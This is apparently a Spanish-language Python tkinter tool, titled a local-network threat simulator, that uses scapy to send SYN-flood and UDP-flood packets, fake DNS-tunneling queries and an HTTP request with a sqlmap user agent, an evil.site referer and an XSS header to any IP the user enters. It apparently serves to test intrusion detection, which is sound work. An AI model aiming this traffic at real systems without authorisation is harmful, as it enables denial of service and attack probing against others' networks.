import tkinter as tk
from tkinter import messagebox
from scapy.all import IP, TCP, UDP, DNS, DNSQR, Raw, send
import random
import threading
import time

class SimuladorAmenazas:
    def __init__(self, ip_objetivo):
        self.ip_objetivo = ip_objetivo

    def syn_flood(self, cantidad=50):
        for _ in range(cantidad):
            pkt = IP(dst=self.ip_objetivo) / TCP(dport=random.randint(20, 1024), flags="S")
            send(pkt, verbose=False)

    def udp_flood(self, cantidad=50):
        for _ in range(cantidad):
            pkt = IP(dst=self.ip_objetivo) / UDP(dport=random.randint(1024, 65535)) / Raw(load="X" * 50)
            send(pkt, verbose=False)

    def dns_tunneling_simulado(self, cantidad=5):
        for _ in range(cantidad):
            subdominio = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=20))
            dominio = f"{subdominio}.malicioso.dominio.com"
            pkt = IP(dst=self.ip_objetivo) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=dominio))
            send(pkt, verbose=False)

    def http_fake_request(self, puerto=80):
        http_payload = (
            "GET / HTTP/1.1\r\n"
            f"Host: {self.ip_objetivo}\r\n"
            "User-Agent: sqlmap/1.4.3\r\n"
            "Referer: http://evil.site/attack\r\n"
            "X-Custom-Header: <script>alert('XSS')</script>\r\n"
            "\r\n"
        )
        pkt = IP(dst=self.ip_objetivo) / TCP(dport=puerto, flags="PA") / Raw(load=http_payload)
        send(pkt, verbose=False)

class InterfazSimulador:
    def __init__(self, root):
        self.root = root
        self.root.title("Simulador de Amenazas (Red Local)")
        self.root.geometry("400x400")
        self.ip_var = tk.StringVar()

        # IP de la víctima
        tk.Label(root, text="IP del objetivo:").pack(pady=5)
        tk.Entry(root, textvariable=self.ip_var, width=30).pack(pady=5)

        # Botones de ataques individuales
        tk.Button(root, text="SYN Flood", width=20, command=self.lanzar_syn).pack(pady=5)
        tk.Button(root, text="UDP Flood", width=20, command=self.lanzar_udp).pack(pady=5)
        tk.Button(root, text="DNS Tunneling", width=20, command=self.lanzar_dns).pack(pady=5)
        tk.Button(root, text="HTTP con cabeceras sospechosas", width=30, command=self.lanzar_http).pack(pady=5)

        # Botón general
        tk.Button(root, text="Ejecutar TODOS", width=25, bg="red", fg="white", command=self.lanzar_todos).pack(pady=15)

    def obtener_ip(self):
        ip = self.ip_var.get()
        if not ip:
            messagebox.showerror("Error", "Por favor, ingresa una IP válida.")
        return ip

    def ejecutar_ataque(self, funcion):
        ip = self.obtener_ip()
        if ip:
            threading.Thread(target=lambda: funcion(ip)).start()

    def lanzar_syn(self):
        self.ejecutar_ataque(lambda ip: SimuladorAmenazas(ip).syn_flood())

    def lanzar_udp(self):
        self.ejecutar_ataque(lambda ip: SimuladorAmenazas(ip).udp_flood())

    def lanzar_dns(self):
        self.ejecutar_ataque(lambda ip: SimuladorAmenazas(ip).dns_tunneling_simulado())

    def lanzar_http(self):
        self.ejecutar_ataque(lambda ip: SimuladorAmenazas(ip).http_fake_request())

    def lanzar_todos(self):
        self.ejecutar_ataque(lambda ip: self.ejecutar_todos(ip))

    def ejecutar_todos(self, ip):
        sim = SimuladorAmenazas(ip)
        sim.syn_flood()
        time.sleep(1)
        sim.udp_flood()
        time.sleep(1)
        sim.dns_tunneling_simulado()
        time.sleep(1)
        sim.http_fake_request()
        messagebox.showinfo("Completado", "Todos los ataques fueron ejecutados.")

if __name__ == "__main__":
    root = tk.Tk()
    app = InterfazSimulador(root)
    root.mainloop()
